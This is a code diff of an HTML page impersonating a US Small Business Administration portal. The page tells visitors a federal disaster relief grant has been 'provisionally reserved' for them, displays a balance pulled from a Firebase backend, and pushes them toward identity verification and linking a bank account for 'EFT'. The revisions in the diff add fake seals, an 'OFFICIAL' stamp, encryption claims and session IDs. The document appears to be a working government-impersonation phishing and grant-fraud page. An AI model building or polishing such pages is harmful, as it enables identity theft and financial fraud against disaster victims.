@@ -2,50 +2,69 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SBA Portal | Access Granted</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SBA | Provisioning Complete</title>
     <style>
-        :root { --sba-blue: #00274c; --sba-green: #10b981; }
-        body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', sans-serif; }
+        :root { --sba-blue: #00274c; --sba-accent: #0071bc; --sba-green: #059669; --sba-red: #ba0c2f; }
+        body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', Roboto, sans-serif; color: #1e293b; }
         
-        .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
-        .nav-header { background: var(--sba-blue); padding: 16px; text-align: center; }
+        .gov-banner { background: #f1f1f1; color: #444; font-size: 10px; padding: 8px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
+        .nav-header { background: var(--sba-blue); padding: 20px; border-bottom: 4px solid var(--sba-red); text-align: center; }
         
-        .container { max-width: 480px; margin: 0 auto; padding: 15px; }
-        .card { background: white; padding: 35px 25px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); border-top: 6px solid var(--sba-green); text-align: center; }
+        .container { max-width: 450px; margin: 20px auto; padding: 0 15px; }
+        .card { background: white; padding: 35px 25px; border-radius: 8px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); text-align: center; position: relative; border: 1px solid #e2e8f0; }
         
-        .success-glow {
-            width: 60px; height: 60px; background: #ecfdf5; color: var(--sba-green);
-            border-radius: 50%; font-size: 30px; margin: 0 auto 15px;
-            display: flex; justify-content: center; align-items: center; border: 2px solid var(--sba-green);
+        /* Official Success Seal */
+        .seal {
+            width: 70px; height: 70px; background: #ecfdf5; color: var(--sba-green);
+            border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; 
+            justify-content: center; border: 2px solid var(--sba-green);
+            font-size: 32px; font-weight: bold;
         }
 
+        /* The Allocation Letter Design */
         .allocation-letter {
-            background: #fff; border: 1px solid #e2e8f0; padding: 20px; border-radius: 8px;
+            background: #fff; border: 1px solid #cbd5e1; padding: 25px 20px; border-radius: 4px;
             text-align: left; margin: 25px 0; position: relative; overflow: hidden;
-            box-shadow: inset 0 0 10px rgba(0,0,0,0.02);
+            background-image: radial-gradient(#f1f5f9 1px, transparent 1px);
+            background-size: 20px 20px;
         }
-        .allocation-letter::before {
-            content: "OFFICIAL"; position: absolute; top: 10px; right: -25px;
-            transform: rotate(45deg); background: #fee2e2; color: #ef4444;
-            font-size: 10px; font-weight: 900; padding: 5px 30px; border: 1px dashed #ef4444;
-        }
-
-        .step-row { display: flex; gap: 15px; margin-bottom: 20px; text-align: left; }
-        .step-num { 
-            width: 28px; height: 28px; background: #f1f5f9; border-radius: 50%; 
-            display: flex; align-items: center; justify-content: center; 
-            font-weight: 900; color: var(--sba-blue); font-size: 12px; flex-shrink: 0;
-            border: 1px solid #cbd5e1;
+        
+        .official-stamp {
+            position: absolute; top: 15px; right: -30px; transform: rotate(35deg);
+            background: rgba(186, 12, 47, 0.1); color: var(--sba-red);
+            border: 2px solid var(--sba-red); font-size: 10px; font-weight: 900;
+            padding: 4px 40px; text-transform: uppercase; letter-spacing: 2px;
         }
 
-        .action-btn {
-            background: var(--sba-blue); color: white; padding: 18px; border-radius: 10px;
-            width: 100%; font-weight: 800; border: none; cursor: pointer;
-            text-transform: uppercase; letter-spacing: 1px; margin-top: 20px;
-            transition: 0.3s;
+        .memo-label { font-size: 9px; color: #64748b; font-weight: 800; text-transform: uppercase; margin: 0; }
+        .user-name { font-size: 16px; font-weight: 800; color: var(--sba-blue); margin: 4px 0 20px; border-bottom: 1px solid #e2e8f0; padding-bottom: 10px; }
+
+        .balance-box {
+            background: var(--sba-blue); color: white; padding: 15px; border-radius: 6px;
+            text-align: center; margin: 15px 0;
         }
-        .action-btn:hover { background: #003a70; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
+        .balance-label { font-size: 10px; text-transform: uppercase; opacity: 0.8; letter-spacing: 1px; display: block; margin-bottom: 5px; }
+        .balance-amount { font-size: 28px; font-weight: 900; letter-spacing: -1px; }
+
+        /* Step Indicators */
+        .steps-container { margin-top: 30px; border-top: 1px solid #f1f5f9; padding-top: 20px; }
+        .step-item { display: flex; gap: 15px; margin-bottom: 20px; text-align: left; align-items: flex-start; }
+        .step-icon { 
+            width: 24px; height: 24px; background: #f1f5f9; border: 1px solid #cbd5e1;
+            border-radius: 50%; display: flex; align-items: center; justify-content: center;
+            font-size: 11px; font-weight: 900; color: var(--sba-blue); flex-shrink: 0;
+        }
+        .step-content b { font-size: 12px; color: var(--sba-blue); text-transform: uppercase; }
+        .step-content p { font-size: 11px; color: #64748b; margin: 3px 0 0; line-height: 1.4; }
+
+        .btn-portal {
+            background: var(--sba-accent); color: white; padding: 16px; border-radius: 4px;
+            width: 100%; font-weight: 700; border: none; cursor: pointer;
+            text-transform: uppercase; letter-spacing: 1px; font-size: 14px; margin-top: 10px;
+        }
+
+        .security-footer { text-align: center; font-size: 9px; color: #94a3b8; margin-top: 25px; line-height: 1.6; }
     </style>
 </head>
 <body>
@@ -56,52 +75,54 @@
     </div>
 
     <div class="nav-header">
-        <h1 style="color:white; margin:0; font-size:14px; letter-spacing:2px; font-weight: 900;">REGISTRATION SUCCESS</h1>
+        <h1 style="color:white; margin:0; font-size:12px; letter-spacing:3px; font-weight: 900; text-transform: uppercase;">Allocation Success</h1>
     </div>
 
     <div class="container">
         <div class="card">
-            <div class="success-glow">✓</div>
-            <h2 style="color: var(--sba-blue); margin: 0; font-size: 22px;">Account Provisioned</h2>
-            <p style="color: #64748b; font-size: 13px; margin-top: 8px;">Your 2026 Disaster Relief Profile is now active.</p>
+            <div class="seal">✓</div>
+            <h2 style="color: var(--sba-blue); margin: 0; font-size: 20px; font-weight: 800;">Identity Confirmed</h2>
+            <p style="color: #64748b; font-size: 13px; margin: 8px 0 0;">Your federal disaster relief profile is now active for 2026.</p>
 
             <div class="allocation-letter">
-                <p style="font-size: 10px; color: #94a3b8; margin: 0; font-weight: 700;">MEMORANDUM FOR:</p>
-                <p id="userName" style="font-size: 14px; font-weight: 900; color: var(--sba-blue); margin: 5px 0 15px;">AUTHENTICATING IDENTITY...</p>
+                <div class="official-stamp">Validated</div>
+                <p class="memo-label">Memorandum for Record:</p>
+                <div id="userName" class="user-name">AUTHENTICATING...</div>
                 
-                <p style="font-size: 11px; color: #475569; line-height: 1.5; margin-bottom: 10px;">
-                    This serves as formal notice that based on your 2026 registration profile, a federal grant allocation has been provisionally reserved under your file:
+                <p style="font-size: 12px; line-height: 1.5; color: #334155;">
+                    Notice of provisional grant allocation. The following funds have been reserved under your registered file ID:
                 </p>
                 
-                <div style="background: #f8fafc; padding: 10px; border-radius: 6px; border-left: 4px solid var(--sba-blue);">
-                    <span style="font-size: 10px; color: #64748b; font-weight: 800; text-transform: uppercase;">Current Allocation:</span>
-                    <div id="userBal" style="font-size: 24px; font-weight: 900; color: var(--sba-blue);">$0.00</div>
+                <div class="balance-box">
+                    <span class="balance-label">Current Allocation</span>
+                    <div id="userBal" class="balance-amount">$0.00</div>
                 </div>
             </div>
 
-            <div class="step-row">
-                <div class="step-num">1</div>
-                <div>
-                    <b style="font-size: 12px; color: var(--sba-blue);">IDENTITY VERIFICATION</b>
-                    <p style="font-size: 11px; color: #64748b; margin: 4px 0;">Satisfy compliance by providing valid government-issued identification.</p>
+            <div class="steps-container">
+                <div class="step-item">
+                    <div class="step-icon">1</div>
+                    <div class="step-content">
+                        <b>Identity Verification</b>
+                        <p>Complete the final KYC compliance check to release funds.</p>
+                    </div>
+                </div>
+                <div class="step-item">
+                    <div class="step-icon">2</div>
+                    <div class="step-content">
+                        <b>EFT Configuration</b>
+                        <p>Establish a secure link to your receiving financial institution.</p>
+                    </div>
                 </div>
             </div>
 
-            <div class="step-row">
-                <div class="step-num">2</div>
-                <div>
-                    <b style="font-size: 12px; color: var(--sba-blue);">DISBURSEMENT SETUP</b>
-                    <p style="font-size: 11px; color: #64748b; margin: 4px 0;">Configure your Electronic Funds Transfer (EFT) destination in the secure ledger.</p>
-                </div>
-            </div>
-
-            <button onclick="location.href='dashboard.html'" class="action-btn">Enter Secure Portal</button>
+            <button onclick="location.href='dashboard.html'" class="btn-portal">Enter Secure Portal</button>
         </div>
 
-        <p style="text-align: center; font-size: 9px; color: #94a3b8; margin-top: 25px; font-family: monospace;">
-            SBA_CORE_TX_ID: <span id="sessionID"></span><br>
-            ENCRYPTION: AES-256-GCM
-        </p>
+        <div class="security-footer">
+            SYSTEM_ID: <span id="sessionID"></span><br>
+            ENCRYPTION: AES-256-GCM SECURE | <a href="#" style="color: #94a3b8; text-decoration: none;">Privacy Policy</a>
+        </div>
     </div>
 
     <script type="module">
@@ -109,7 +130,6 @@
         import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
         import { getFirestore, doc, getDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
-        // MATCHED CONFIG: Using sba-portal-2026-f1253
         const firebaseConfig = {
             apiKey: "AIzaSyCq8CgTyNbKVbUm_GItIC7FAvTuNrNspxI",
             authDomain: "sba-portal-2026-f1253.firebaseapp.com",
@@ -124,16 +144,8 @@
         const db = getFirestore(app);
 
         onAuthStateChanged(auth, async (user) => {
-            if (!user) { 
-                window.location.href = 'index.html'; 
-                return; 
-            }
-            
-            // SECURITY: Only allow verified emails to see the letter
-            if (!user.emailVerified) {
-                window.location.href = 'verify.html';
-                return;
-            }
+            if (!user) { window.location.href = 'index.html'; return; }
+            if (!user.emailVerified) { window.location.href = 'verify.html'; return; }
             
             try {
                 const snap = await getDoc(doc(db, "users", user.uid));
@@ -149,12 +161,10 @@
                         maximumFractionDigits: 2
                     });
                 }
-            } catch (error) {
-                console.error("Profile lookup failed");
-            }
+            } catch (error) { console.log("Profile Sync Error"); }
         });
 
-        document.getElementById('sessionID').innerText = "SBA-TX-" + Math.random().toString(36).substr(2, 9).toUpperCase();
+        document.getElementById('sessionID').innerText = "SBA-AUTH-" + Math.random().toString(36).substr(2, 9).toUpperCase();
     </script>
 </body>
 </html>
